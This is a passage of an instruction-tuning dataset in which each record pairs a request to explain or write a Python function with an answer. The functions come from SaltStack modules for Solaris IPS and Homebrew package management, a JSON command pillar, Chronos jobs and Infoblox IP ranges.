salt.utils.files.fopen(pyminver, 'w+') as fp_:\n        fp_.write(str(sys.version_info[0]))  # future lint: disable=blacklisted-function\n    os.chdir(os.path.dirname(minver))\n    tfp.add('version')\n    tfp.add('.min-gen-py-version')\n    if start_dir:\n        os.chdir(start_dir)\n    tfp.close()\n    return mintar"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef min_sum(cachedir, form='sha1'):\n    '''\n    Return the checksum of the current thin tarball\n    '''\n    mintar = gen_min(cachedir)\n    return salt.utils.hashutils.get_hash(mintar, form)", "response": "Return the checksum of the current thin tarball"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nrefreshes the remote repos database.", "response": "def refresh_db(full=False, **kwargs):\n    '''\n    Updates the remote repos database.\n\n    full : False\n\n        Set to ``True`` to force a refresh of the pkg DB from all publishers,\n        regardless of the last refresh time.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.refresh_db\n        salt '*' pkg.refresh_db full=True\n    '''\n    # Remove rtag file to keep multiple refreshes from happening in pkg states\n    salt.utils.pkg.clear_rtag(__opts__)\n    if full:\n        return __salt__['cmd.retcode']('/bin/pkg refresh --full') == 0\n    else:\n        return __salt__['cmd.retcode']('/bin/pkg refresh') == 0"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef upgrade_available(name, **kwargs):\n    '''\n    Check if there is an upgrade available for a certain package\n    Accepts full or partial FMRI. Returns all matches found.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.upgrade_available apache-22\n    '''\n    version = None\n    cmd = ['pkg', 'list', '-Huv', name]\n    lines = __salt__['cmd.run_stdout'](cmd).splitlines()\n    if not lines:\n        return {}\n    ret = {}\n    for line in lines:\n        ret[_ips_get_pkgname(line)] = _ips_get_pkgversion(line)\n    return ret", "response": "Check if there is an upgrade available for a certain package. Returns all matches found"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef list_upgrades(refresh=True, **kwargs):  # pylint: disable=W0613\n    '''\n    Lists all packages available for update.\n\n    When run in global zone, it reports only upgradable packages for the global\n    zone.\n\n    When run in non-global zone, it can report more upgradable packages than\n    ``pkg update -vn``, because ``pkg update`` hides packages that require\n    newer version of ``pkg://solaris/entire`` (which means that they can be\n    upgraded only from the global zone). If ``pkg://solaris/entire`` is found\n    in the list of upgrades, then the global zone should be updated to get all\n    possible updates. Use ``refresh=True`` to refresh the package database.\n\n    refresh : True\n        Runs a full package database refresh before listing. Set to ``False`` to\n        disable running the refresh.\n\n        .. versionchanged:: 2017.7.0\n\n        In previous versions of Salt, ``refresh`` defaulted to ``False``. This was\n        changed to default to ``True`` in the 2017.7.0 release to make the behavior\n        more consistent with the other package modules, which all default to ``True``.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.list_upgrades\n        salt '*' pkg.list_upgrades refresh=False\n    '''\n    if salt.utils.data.is_true(refresh):\n        refresh_db(full=True)\n    upgrades = {}\n    # awk is in core-os package so we can use it without checking\n    lines = __salt__['cmd.run_stdout'](\"/bin/pkg list -Huv\").splitlines()\n    for line in lines:\n        upgrades[_ips_get_pkgname(line)] = _ips_get_pkgversion(line)\n    return upgrades", "response": "List all packages available for update."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef upgrade(refresh=False, **kwargs):\n    '''\n    Upgrade all packages to the latest possible version.\n    When run in global zone, it updates also all non-global zones.\n    In non-global zones upgrade is limited by dependency constrains linked to\n    the version of pkg://solaris/entire.\n\n    Returns a dictionary containing the changes:\n\n    .. code-block:: python\n\n        {'<package>':  {'old': '<old-version>',\n                        'new': '<new-version>'}}\n\n    When there is a failure, an explanation is also included in the error\n    message, based on the return code of the ``pkg update`` command.\n\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.upgrade\n    '''\n    if salt.utils.data.is_true(refresh):\n        refresh_db()\n\n    # Get a list of the packages before install so we can diff after to see\n    # what got installed.\n    old = list_pkgs()\n\n    # Install or upgrade the package\n    # If package is already installed\n    cmd = ['pkg', 'update', '-v', '--accept']\n    result = __salt__['cmd.run_all'](cmd,\n                                     output_loglevel='trace',\n                                     python_shell=False)\n    __context__.pop('pkg.list_pkgs', None)\n    new = list_pkgs()\n    ret = salt.utils.data.compare_dicts(old, new)\n\n    if result['retcode'] != 0:\n        raise CommandExecutionError(\n            'Problem encountered upgrading packages',\n            info={'changes': ret,\n                  'retcode': ips_pkg_return_values[result['retcode']],\n                  'result': result}\n        )\n\n    return ret", "response": "Upgrade all packages to the latest possible version."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nlist the currently installed packages as a dict.", "response": "def list_pkgs(versions_as_list=False, **kwargs):\n    '''\n    List the currently installed packages as a dict::\n\n        {'<package_name>': '<version>'}\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.list_pkgs\n    '''\n    # not yet implemented or not applicable\n    if any([salt.utils.data.is_true(kwargs.get(x))\n        for x in ('removed', 'purge_desired')]):\n        return {}\n\n    if 'pkg.list_pkgs' in __context__:\n        if versions_as_list:\n            return __context__['pkg.list_pkgs']\n        else:\n            ret = copy.deepcopy(__context__['pkg.list_pkgs'])\n            __salt__['pkg_resource.stringify'](ret)\n            return ret\n\n    ret = {}\n    cmd = '/bin/pkg list -Hv'\n    lines = __salt__['cmd.run_stdout'](cmd).splitlines()\n    # column 1 is full FMRI name in form pkg://publisher/class/name@version\n    for line in lines:\n        name = _ips_get_pkgname(line)\n        version = _ips_get_pkgversion(line)\n        __salt__['pkg_resource.add_pkg'](ret, name, version)\n\n    __salt__['pkg_resource.sort_pkglist'](ret)\n    __context__['pkg.list_pkgs'] = copy.deepcopy(ret)\n    if not versions_as_list:\n        __salt__['pkg_resource.stringify'](ret)\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns the version of the specified packages.", "response": "def version(*names, **kwargs):\n    '''\n    Common interface for obtaining the version of installed packages.\n    Accepts full or partial FMRI. If called using pkg_resource, full FMRI is required.\n    Partial FMRI is returned if the package is not installed.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.version vim\n        salt '*' pkg.version foo bar baz\n        salt '*' pkg_resource.version pkg://solaris/entire\n\n    '''\n    if not names:\n        return ''\n\n    cmd = ['/bin/pkg', 'list', '-Hv']\n    cmd.extend(names)\n    lines = __salt__['cmd.run_stdout'](cmd, ignore_retcode=True).splitlines()\n    ret = {}\n    for line in lines:\n        ret[_ips_get_pkgname(line)] = _ips_get_pkgversion(line)\n\n    # Append package names which are not installed/found\n    unmatched = list([name for name in names if not reduce(lambda x, y: x or name in y, ret, False)])  # pylint: disable=W0640\n    ret.update(zip(unmatched, itertools.cycle(('',))))\n\n    # Return a string if only one package name passed\n    if len(names) == 1:\n        try:\n            return next(six.itervalues(ret))\n        except StopIteration:\n            return ''\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_fmri(name, **kwargs):\n    '''\n    Returns FMRI from partial name. Returns empty string ('') if not found.\n    In case of multiple match, the function returns list of all matched packages.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.get_fmri bash\n    '''\n    if name.startswith('pkg://'):\n        # already full fmri\n        return name\n    cmd = ['/bin/pkg', 'list', '-aHv', name]\n    # there can be more packages matching the name\n    lines = __salt__['cmd.run_stdout'](cmd).splitlines()\n    if not lines:\n        # empty string = package not found\n        return ''\n    ret = []\n    for line in lines:\n        ret.append(_ips_get_pkgname(line))\n\n    return ret", "response": "Returns FMRI from partial name."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nnormalize pkg name to full FMRI before running it.", "response": "def normalize_name(name, **kwargs):\n    '''\n    Internal function. Normalizes pkg name to full FMRI before running\n    pkg.install. In case of multiple matches or no match, it returns the name\n    without modifications.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.normalize_name vim\n    '''\n    if name.startswith('pkg://'):\n        # already full fmri\n        return name\n    cmd = ['/bin/pkg', 'list', '-aHv', name]\n    # there can be more packages matching the name\n    lines = __salt__['cmd.run_stdout'](cmd).splitlines()\n    # if we get more lines, it's multiple match (name not unique)\n    # if we get zero lines, pkg is not installed\n    # in both ways it's safer to return original (unmodified) name and let \"pkg install\" to deal with it\n    if len(lines) != 1:\n        return name\n    # return pkg name\n    return _ips_get_pkgname(lines[0])"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nsearch the repository for a given pkg name.", "response": "def search(name, versions_as_list=False, **kwargs):\n    '''\n    Searches the repository for given pkg name.\n    The name can be full or partial FMRI. All matches are printed. Globs are\n    also supported.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.search bash\n    '''\n\n    ret = {}\n    cmd = ['/bin/pkg', 'list', '-aHv', name]\n    out = __salt__['cmd.run_all'](cmd, ignore_retcode=True)\n    if out['retcode'] != 0:\n        # error = nothing found\n        return {}\n    # no error, processing pkg listing\n    # column 1 is full FMRI name in form pkg://publisher/pkg/name@version\n    for line in out['stdout'].splitlines():\n        name = _ips_get_pkgname(line)\n        version = _ips_get_pkgversion(line)\n        __salt__['pkg_resource.add_pkg'](ret, name, version)\n\n    if not versions_as_list:\n        __salt__['pkg_resource.stringify'](ret)\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ninstalling a named package using the IPS pkg command.", "response": "def install(name=None, refresh=False, pkgs=None, version=None, test=False, **kwargs):\n    '''\n    Install the named package using the IPS pkg command.\n    Accepts full or partial FMRI.\n\n    Returns a dict containing the new package names and versions::\n\n        {'<package>': {'old': '<old-version>',\n                       'new': '<new-version>'}}\n\n\n    Multiple Package Installation Options:\n\n    pkgs\n        A list of packages to install. Must be passed as a python list.\n\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.install vim\n        salt '*' pkg.install pkg://solaris/editor/vim\n        salt '*' pkg.install pkg://solaris/editor/vim refresh=True\n        salt '*' pkg.install pkgs='[\"foo\", \"bar\"]'\n    '''\n    if not pkgs:\n        if is_installed(name):\n            return {}\n\n    if refresh:\n        refresh_db(full=True)\n\n    pkg2inst = ''\n    if pkgs:    # multiple packages specified\n        pkg2inst = []\n        for pkg in pkgs:\n            if getattr(pkg, 'items', False):\n                if list(pkg.items())[0][1]:   # version specified\n                    pkg2inst.append('{0}@{1}'.format(list(pkg.items())[0][0],\n                                                     list(pkg.items())[0][1]))\n                else:\n                    pkg2inst.append(list(pkg.items())[0][0])\n            else:\n                pkg2inst.append(\"{0}\".format(pkg))\n        log.debug('Installing these packages instead of %s: %s',\n                  name, pkg2inst)\n\n    else:   # install single package\n        if version:\n            pkg2inst = \"{0}@{1}\".format(name, version)\n        else:\n            pkg2inst = \"{0}\".format(name)\n\n    cmd = ['pkg', 'install', '-v', '--accept']\n    if test:\n        cmd.append('-n')\n\n    # Get a list of the packages before install so we can diff after to see\n    # what got installed.\n    old = list_pkgs()\n\n    # Install or upgrade the package\n    # If package is already installed\n    if isinstance(pkg2inst, string_types):\n        cmd.append(pkg2inst)\n    elif isinstance(pkg2inst, list):\n        cmd = cmd + pkg2inst\n\n    out = __salt__['cmd.run_all'](cmd, output_loglevel='trace')\n\n    # Get a list of the packages again, including newly installed ones.\n    __context__.pop('pkg.list_pkgs', None)\n    new = list_pkgs()\n    ret = salt.utils.data.compare_dicts(old, new)\n\n    if out['retcode'] != 0:\n        raise CommandExecutionError(\n            'Error occurred installing package(s)',\n            info={\n                'changes': ret,\n                'retcode': ips_pkg_return_values[out['retcode']],\n                'errors': [out['stderr']]\n            }\n        )\n\n    # No error occurred\n    if test:\n        return 'Test succeeded.'\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nremoves a package from the system.", "response": "def remove(name=None, pkgs=None, **kwargs):\n    '''\n    Remove specified package. Accepts full or partial FMRI.\n    In case of multiple match, the command fails and won't modify the OS.\n\n    name\n        The name of the package to be deleted.\n\n\n    Multiple Package Options:\n\n    pkgs\n        A list of packages to delete. Must be passed as a python list. The\n        ``name`` parameter will be ignored if this option is passed.\n\n\n    Returns a list containing the removed packages.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.remove <package name>\n        salt '*' pkg.remove tcsh\n        salt '*' pkg.remove pkg://solaris/shell/tcsh\n        salt '*' pkg.remove pkgs='[\"foo\", \"bar\"]'\n    '''\n    targets = salt.utils.args.split_input(pkgs) if pkgs else [name]\n    if not targets:\n        return {}\n\n    if pkgs:\n        log.debug('Removing these packages instead of %s: %s', name, targets)\n\n    # Get a list of the currently installed pkgs.\n    old = list_pkgs()\n\n    # Remove the package(s)\n    cmd = ['/bin/pkg', 'uninstall', '-v'] + targets\n    out = __salt__['cmd.run_all'](cmd, output_loglevel='trace')\n\n    # Get a list of the packages after the uninstall\n    __context__.pop('pkg.list_pkgs', None)\n    new = list_pkgs()\n    ret = salt.utils.data.compare_dicts(old, new)\n\n    if out['retcode'] != 0:\n        raise CommandExecutionError(\n            'Error occurred removing package(s)',\n            info={\n                'changes': ret,\n                'retcode': ips_pkg_return_values[out['retcode']],\n                'errors': [out['stderr']]\n            }\n        )\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nexecuting a command and read the output as JSON", "response": "def ext_pillar(minion_id,  # pylint: disable=W0613\n               pillar,  # pylint: disable=W0613\n               command):\n    '''\n    Execute a command and read the output as JSON\n    '''\n    try:\n        command = command.replace('%s', minion_id)\n        return salt.utils.json.loads(__salt__['cmd.run'](command))\n    except Exception:\n        log.critical('JSON data from %s failed to parse', command)\n        return {}"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _tap(tap, runas=None):\n    '''\n    Add unofficial GitHub repos to the list of formulas that brew tracks,\n    updates, and installs from.\n    '''\n    if tap in _list_taps():\n        return True\n\n    cmd = 'tap {0}'.format(tap)\n    try:\n        _call_brew(cmd)\n    except CommandExecutionError:\n        log.error('Failed to tap \"%s\"', tap)\n        return False\n\n    return True", "response": "Return True if the given command is successful False otherwise."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncalls the brew command with the user account of brew", "response": "def _call_brew(cmd, failhard=True):\n    '''\n    Calls the brew command with the user account of brew\n    '''\n    user = __salt__['file.get_user'](_homebrew_bin())\n    runas = user if user != __opts__['user'] else None\n    cmd = '{} {}'.format(salt.utils.path.which('brew'), cmd)\n    result = __salt__['cmd.run_all'](cmd,\n                                     runas=runas,\n                                     output_loglevel='trace',\n                                     python_shell=False)\n    if failhard and result['retcode'] != 0:\n        raise CommandExecutionError('Brew command failed',\n                                    info={'result': result})\n    return result"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef list_pkgs(versions_as_list=False, **kwargs):\n    '''\n    List the packages currently installed in a dict::\n\n        {'<package_name>': '<version>'}\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.list_pkgs\n    '''\n    versions_as_list = salt.utils.data.is_true(versions_as_list)\n    # not yet implemented or not applicable\n    if any([salt.utils.data.is_true(kwargs.get(x))\n            for x in ('removed', 'purge_desired')]):\n        return {}\n\n    if 'pkg.list_pkgs' in __context__:\n        if versions_as_list:\n            return __context__['pkg.list_pkgs']\n        else:\n            ret = copy.deepcopy(__context__['pkg.list_pkgs'])\n            __salt__['pkg_resource.stringify'](ret)\n            return ret\n\n    ret = {}\n    cmd = 'info --json=v1 --installed'\n    package_info = salt.utils.json.loads(_call_brew(cmd)['stdout'])\n\n    for package in package_info:\n        # Brew allows multiple versions of the same package to be installed.\n        # Salt allows for this, so it must be accounted for.\n        versions = [v['version'] for v in package['installed']]\n        # Brew allows for aliasing of packages, all of which will be\n        # installable from a Salt call, so all names must be accounted for.\n        names = package['aliases'] + [package['name'], package['full_name']]\n        # Create a list of tuples containing all possible combinations of\n        # names and versions, because all are valid.\n        combinations = [(n, v) for n in names for v in versions]\n\n        for name, version in combinations:\n            __salt__['pkg_resource.add_pkg'](ret, name, version)\n\n    # Grab packages from brew cask, if available.\n    # Brew Cask doesn't provide a JSON interface, must be parsed the old way.\n    try:\n        cask_cmd = 'cask list --versions'\n        out = _call_brew(cask_cmd)['stdout']\n\n        for line in out.splitlines():\n            try:\n                name_and_versions = line.split(' ')\n                name = '/'.join(('caskroom/cask', name_and_versions[0]))\n                installed_versions = name_and_versions[1:]\n                key_func = functools.cmp_to_key(salt.utils.versions.version_cmp)\n                newest_version = sorted(installed_versions, key=key_func).pop()\n            except ValueError:\n                continue\n            __salt__['pkg_resource.add_pkg'](ret, name, newest_version)\n    except CommandExecutionError:\n        pass\n\n    __salt__['pkg_resource.sort_pkglist'](ret)\n    __context__['pkg.list_pkgs'] = copy.deepcopy(ret)\n    if not versions_as_list:\n        __salt__['pkg_resource.stringify'](ret)\n    return ret", "response": "List the packages currently installed in a dict."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef remove(name=None, pkgs=None, **kwargs):\n    '''\n    Removes packages with ``brew uninstall``.\n\n    name\n        The name of the package to be deleted.\n\n\n    Multiple Package Options:\n\n    pkgs\n        A list of packages to delete. Must be passed as a python list. The\n        ``name`` parameter will be ignored if this option is passed.\n\n    .. versionadded:: 0.16.0\n\n\n    Returns a dict containing the changes.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.remove <package name>\n        salt '*' pkg.remove <package1>,<package2>,<package3>\n        salt '*' pkg.remove pkgs='[\"foo\", \"bar\"]'\n    '''\n    try:\n        pkg_params = __salt__['pkg_resource.parse_targets'](\n            name, pkgs, **kwargs\n        )[0]\n    except MinionError as exc:\n        raise CommandExecutionError(exc)\n\n    old = list_pkgs()\n    targets = [x for x in pkg_params if x in old]\n    if not targets:\n        return {}\n    cmd = 'uninstall {0}'.format(' '.join(targets))\n\n    out = _call_brew(cmd)\n    if out['retcode'] != 0 and out['stderr']:\n        errors = [out['stderr']]\n    else:\n        errors = []\n\n    __context__.pop('pkg.list_pkgs', None)\n    new = list_pkgs()\n    ret = salt.utils.data.compare_dicts(old, new)\n\n    if errors:\n        raise CommandExecutionError(\n            'Problem encountered removing package(s)',\n            info={'errors': errors, 'changes': ret}\n        )\n\n    return ret", "response": "Removes packages with brew uninstall."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef refresh_db(**kwargs):\n    '''\n    Update the homebrew package repository.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.refresh_db\n    '''\n    # Remove rtag file to keep multiple refreshes from happening in pkg states\n    salt.utils.pkg.clear_rtag(__opts__)\n    cmd = 'update'\n    if _call_brew(cmd)['retcode']:\n        log.error('Failed to update')\n        return False\n\n    return True", "response": "Update the homebrew package repository."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _info(*pkgs):\n    '''\n    Get all info brew can provide about a list of packages.\n\n    Does not do any kind of processing, so the format depends entirely on\n    the output brew gives. This may change if a new version of the format is\n    requested.\n\n    On failure, returns an empty dict and logs failure.\n    On success, returns a dict mapping each item in pkgs to its corresponding\n    object in the output of 'brew info'.\n\n    Caveat: If one of the packages does not exist, no packages will be\n            included in the output.\n    '''\n    cmd = 'info --json=v1 {0}'.format(' '.join(pkgs))\n    brew_result = _call_brew(cmd)\n    if brew_result['retcode']:\n        log.error('Failed to get info about packages: %s',\n                  ' '.join(pkgs))\n        return {}\n    output = salt.utils.json.loads(brew_result['stdout'])\n    return dict(zip(pkgs, output))", "response": "Return info about a list of packages."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef install(name=None, pkgs=None, taps=None, options=None, **kwargs):\n    '''\n    Install the passed package(s) with ``brew install``\n\n    name\n        The name of the formula to be installed. Note that this parameter is\n        ignored if \"pkgs\" is passed.\n\n        CLI Example:\n\n        .. code-block:: bash\n\n            salt '*' pkg.install <package name>\n\n    taps\n        Unofficial GitHub repos to use when updating and installing formulas.\n\n        CLI Example:\n\n        .. code-block:: bash\n\n            salt '*' pkg.install <package name> tap='<tap>'\n            salt '*' pkg.install zlib taps='homebrew/dupes'\n            salt '*' pkg.install php54 taps='[\"josegonzalez/php\", \"homebrew/dupes\"]'\n\n    options\n        Options to pass to brew. Only applies to initial install. Due to how brew\n        works, modifying chosen options requires a full uninstall followed by a\n        fresh install. Note that if \"pkgs\" is used, all options will be passed\n        to all packages. Unrecognized options for a package will be silently\n        ignored by brew.\n\n        CLI Example:\n\n        .. code-block:: bash\n\n            salt '*' pkg.install <package name> tap='<tap>'\n            salt '*' pkg.install php54 taps='[\"josegonzalez/php\", \"homebrew/dupes\"]' options='[\"--with-fpm\"]'\n\n    Multiple Package Installation Options:\n\n    pkgs\n        A list of formulas to install. Must be passed as a python list.\n\n        CLI Example:\n\n        .. code-block:: bash\n\n            salt '*' pkg.install pkgs='[\"foo\",\"bar\"]'\n\n\n    Returns a dict containing the new package names and versions::\n\n        {'<package>': {'old': '<old-version>',\n                       'new': '<new-version>'}}\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.install 'package package package'\n    '''\n    try:\n        pkg_params, pkg_type = __salt__['pkg_resource.parse_targets'](\n            name, pkgs, kwargs.get('sources', {})\n        )\n    except MinionError as exc:\n        raise CommandExecutionError(exc)\n\n    if not pkg_params:\n        return {}\n\n    formulas = ' '.join(pkg_params)\n    old = list_pkgs()\n\n    # Ensure we've tapped the repo if necessary\n    if taps:\n        if not isinstance(taps, list):\n            # Feels like there is a better way to allow for tap being\n            # specified as both a string and a list\n            taps = [taps]\n\n        for tap in taps:\n            _tap(tap)\n\n    if options:\n        cmd = 'install {0} {1}'.format(formulas, ' '.join(options))\n    else:\n        cmd = 'install {0}'.format(formulas)\n\n    out = _call_brew(cmd)\n    if out['retcode'] != 0 and out['stderr']:\n        errors = [out['stderr']]\n    else:\n        errors = []\n\n    __context__.pop('pkg.list_pkgs', None)\n    new = list_pkgs()\n    ret = salt.utils.data.compare_dicts(old, new)\n\n    if errors:\n        raise CommandExecutionError(\n            'Problem encountered installing package(s)',\n            info={'errors': errors, 'changes': ret}\n        )\n\n    return ret", "response": "Returns a dict containing the new packages and versions of the passed package."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nlists the available upgrade packages for all packages", "response": "def list_upgrades(refresh=True, **kwargs):  # pylint: disable=W0613\n    '''\n    Check whether or not an upgrade is available for all packages\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.list_upgrades\n    '''\n    if refresh:\n        refresh_db()\n\n    res = _call_brew('outdated --json=v1')\n    ret = {}\n\n    try:\n        data = salt.utils.json.loads(res['stdout'])\n    except ValueError as err:\n        msg = 'unable to interpret output from \"brew outdated\": {0}'.format(err)\n        log.error(msg)\n        raise CommandExecutionError(msg)\n\n    for pkg in data:\n        # current means latest available to brew\n        ret[pkg['name']] = pkg['current_version']\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef upgrade(refresh=True, **kwargs):\n    '''\n    Upgrade outdated, unpinned brews.\n\n    refresh\n        Fetch the newest version of Homebrew and all formulae from GitHub before installing.\n\n    Returns a dictionary containing the changes:\n\n    .. code-block:: python\n\n        {'<package>':  {'old': '<old-version>',\n                        'new': '<new-version>'}}\n\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.upgrade\n    '''\n    ret = {'changes': {},\n           'result': True,\n           'comment': '',\n           }\n\n    old = list_pkgs()\n\n    if salt.utils.data.is_true(refresh):\n        refresh_db()\n\n    result = _call_brew('upgrade', failhard=False)\n    __context__.pop('pkg.list_pkgs', None)\n    new = list_pkgs()\n    ret = salt.utils.data.compare_dicts(old, new)\n\n    if result['retcode'] != 0:\n        raise CommandExecutionError(\n            'Problem encountered upgrading packages',\n            info={'changes': ret, 'result': result}\n        )\n\n    return ret", "response": "Upgrade outdated unpinned brews."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef config(name, config):\n    '''\n    Ensure that the chronos job with the given name is present and is configured\n    to match the given config values.\n\n    :param name: The job name\n    :param config: The configuration to apply (dict)\n    :return: A standard Salt changes dictionary\n    '''\n    # setup return structure\n    ret = {\n        'name': name,\n        'changes': {},\n        'result': False,\n        'comment': '',\n    }\n\n    # get existing config if job is present\n    existing_config = None\n    if __salt__['chronos.has_job'](name):\n        existing_config = __salt__['chronos.job'](name)['job']\n\n    # compare existing config with defined config\n    if existing_config:\n        update_config = copy.deepcopy(existing_config)\n        salt.utils.configcomparer.compare_and_update_config(\n            config,\n            update_config,\n            ret['changes'],\n        )\n    else:\n        # the job is not configured--we need to create it from scratch\n        ret['changes']['job'] = {\n            'new': config,\n            'old': None,\n        }\n        update_config = config\n\n    if ret['changes']:\n        # if the only change is in schedule, check to see if patterns are equivalent\n        if 'schedule' in ret['changes'] and len(ret['changes']) == 1:\n            if 'new' in ret['changes']['schedule'] and 'old' in ret['changes']['schedule']:\n                new = ret['changes']['schedule']['new']\n                log.debug('new schedule: %s', new)\n                old = ret['changes']['schedule']['old']\n                log.debug('old schedule: %s', old)\n                if new and old:\n                    _new = new.split('/')\n                    log.debug('_new schedule: %s', _new)\n                    _old = old.split('/')\n                    log.debug('_old schedule: %s', _old)\n                    if len(_new) == 3 and len(_old) == 3:\n                        log.debug('_new[0] == _old[0]: %s',\n                                  six.text_type(_new[0]) == six.text_type(_old[0]))\n                        log.debug('_new[2] == _old[2]: %s',\n                                  six.text_type(_new[2]) == six.text_type(_old[2]))\n                        if six.text_type(_new[0]) == six.text_type(_old[0]) and \\\n                                six.text_type(_new[2]) == six.text_type(_old[2]):\n                            log.debug('schedules match--no need for changes')\n                            ret['changes'] = {}\n\n    # update the config if we registered any changes\n    log.debug('schedules match--no need for changes')\n    if ret['changes']:\n        # if test report there will be an update\n        if __opts__['test']:\n            ret['result'] = None\n            ret['comment'] = 'Chronos job {0} is set to be updated'.format(\n                name\n            )\n            return ret\n\n        update_result = __salt__['chronos.update_job'](name, update_config)\n        if 'exception' in update_result:\n            ret['result'] = False\n            ret['comment'] = 'Failed to update job config for {0}: {1}'.format(\n                name,\n                update_result['exception'],\n            )\n            return ret\n        else:\n            ret['result'] = True\n            ret['comment'] = 'Updated job config for {0}'.format(name)\n            return ret\n    ret['result'] = True\n    ret['comment'] = 'Chronos job {0} configured correctly'.format(name)\n    return ret", "response": "Ensure that the chronos job with the given name is configured with the given config values."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nensures that a range record is present.", "response": "def present(name=None, start_addr=None, end_addr=None, data=None, **api_opts):\n    '''\n    Ensure range record is present.\n\n    infoblox_range.present:\n        start_addr: '129.97.150.160',\n        end_addr: '129.97.150.170',\n\n    Verbose state example:\n\n    .. code-block:: yaml\n\n        infoblox_range.present:\n            data: {\n                'always_update_dns': False,\n                'authority': False,\n                'comment': 'range of IP addresses used for salt.. was used for ghost images deployment',\n                'ddns_generate_hostname': True,\n                'deny_all_clients': False,\n                'deny_bootp': False,\n                'disable': False,\n                'email_list': [],\n                'enable_ddns': False,\n                'enable_dhcp_thresholds': False,\n                'enable_email_warnings': False,\n                'enable_ifmap_publishing': False,\n                'enable_snmp_warnings': False,\n                'end_addr': '129.97.150.169',\n                'exclude': [],\n                'extattrs': {},\n                'fingerprint_filter_rules': [],\n                'high_water_mark': 95,\n                'high_water_mark_reset': 85,\n                'ignore_dhcp_option_list_request': False,\n                'lease_scavenge_time': -1,\n                'logic_filter_rules': [],\n                'low_water_mark': 0,\n                'low_water_mark_reset': 10,\n                'mac_filter_rules': [],\n                'member': {'_struct': 'dhcpmember',\n                        'ipv4addr': '129.97.128.9',\n                        'name': 'cn-dhcp-mc.example.ca'},\n                'ms_options': [],\n                'nac_filter_rules': [],\n                'name': 'ghost-range',\n                'network': '129.97.150.0/24',\n                'network_view': 'default',\n                'option_filter_rules': [],\n                'options': [{'name': 'dhcp-lease-time',\n                            'num': 51,\n                            'use_option': False,\n                            'value': '43200',\n                            'vendor_class': 'DHCP'}],\n                'recycle_leases': True,\n                'relay_agent_filter_rules': [],\n                'server_association_type': 'MEMBER',\n                'start_addr': '129.97.150.160',\n                'update_dns_on_lease_renewal': False,\n                'use_authority': False,\n                'use_bootfile': False,\n                'use_bootserver': False,\n                'use_ddns_domainname': False,\n                'use_ddns_generate_hostname': True,\n                'use_deny_bootp': False,\n                'use_email_list': False,\n                'use_enable_ddns': False,\n                'use_enable_dhcp_thresholds': False,\n                'use_enable_ifmap_publishing': False,\n                'use_ignore_dhcp_option_list_request': False,\n                'use_known_clients': False,\n                'use_lease_scavenge_time': False,\n                'use_nextserver': False,\n                'use_options': False,\n                'use_recycle_leases': False,\n                'use_unknown_clients': False,\n                'use_update_dns_on_lease_renewal': False\n            }\n    '''\n    ret = {'name': name, 'result': False, 'comment': '', 'changes': {}}\n\n    if not data:\n        data = {}\n    if 'name' not in data:\n        data.update({'name': name})\n    if 'start_addr' not in data:\n        data.update({'start_addr': start_addr})\n    if 'end_addr' not in data:\n        data.update({'end_addr': end_addr})\n\n    obj = __salt__['infoblox.get_ipv4_range'](data['start_addr'], data['end_addr'], **api_opts)\n    if obj is None:\n        obj = __salt__['infoblox.get_ipv4_range'](start_addr=data['start_addr'], end_addr=None, **api_opts)\n        if obj is None:\n            obj = __salt__['infoblox.get_ipv4_range'](start_addr=None, end_addr=data['end_addr'], **api_opts)\n\n    if obj:\n        diff = 